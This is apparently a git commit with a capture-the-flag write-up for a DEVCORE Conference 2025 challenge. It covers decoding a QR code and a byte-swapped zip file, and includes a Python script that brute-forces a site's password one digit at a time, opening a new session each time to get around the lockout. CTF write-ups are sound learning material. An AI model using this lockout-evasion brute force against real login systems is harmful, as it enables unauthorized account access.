a473d3d7e4350878c383195fd97eaaf2ecedd805
TWNWAKing <shashashane0427@gmail.com>
2025-03-17 09:52:53 +0800

    Init

---
+++ README.md
@@ -0,0 +1,32 @@
+# DEVCORE Conference 2025 CTF 磁片密令：聯合作戰 Writeup
+
+## Stage 1
+
+1. 有四種不同的磁片，分別是 Binary 以及 Hex 的形式，把 Binary 以及 Hex 分別組合起來
+
+- Binary 的兩片組出來會是一張 QR code，掃出來是 zip 密碼
+- Hex 將兩兩 Byte 反轉合併會得到 zip 檔
+
+因為
+
+```text
+0027 0000 001b 0000 4b50 0201 031e 000a
+...
+```
+
+看到 4b50 聯想到 ASCII 碼為 KP，所以將兩兩 Byte 反轉會得到 PK，是 zip 檔的 Magic Number。
+
+## Stage 2
+
+會進到一個網站，可以一位一位爆破密碼，但是一個 Session 猜錯會被鎖起來所以要一直清 cookie。
+不然你不想工人智慧的話你抓一下 HTTP Request 會發現有一個 Post Request 參數 `c` 會回傳你猜的密碼 digit，注意到他是看每個 session 猜的順序所以就可以寫爆破的腳本了
+
+## Exploit
+
+QRCode 見 `qrcode.py`
+爆破腳本見 `guess.py`
+(如果網站下線了就算了)
+
+## Acknowledgement
+
+- [Tony](https://t510599.github.io/)
---
+++ guess.py
@@ -0,0 +1,34 @@
+import requests
+from tqdm import tqdm
+
+url = 'http://hierophant-project.website'
+
+password_len = 9 # By social engineering
+digits = "0123456789"
+password = ""
+
+def guess_password(now_pass):
+    session = requests.Session()
+    for digit in now_pass:
+        data = {'c': digit}
+        response = session.post(url, data=data)
+        
+        if response.status_code == 200:
+            response_json = response.json()
+            # print(response_json)
+            if response_json.get('valid', True):
+                continue
+            else:
+                return False
+    return True
+
+for i in tqdm(range(password_len), desc="Password position"):
+    for digit in tqdm(digits, desc=f"Trying digit at position {i+1}", leave=False):
+        attempt = password + digit
+        if guess_password(attempt):
+            password += digit
+            tqdm.write(f"Found digit at position {i+1}: {digit}")
+            tqdm.write(f"Current password: {password}")
+            break
+
+print(f"Final password found: {password}")
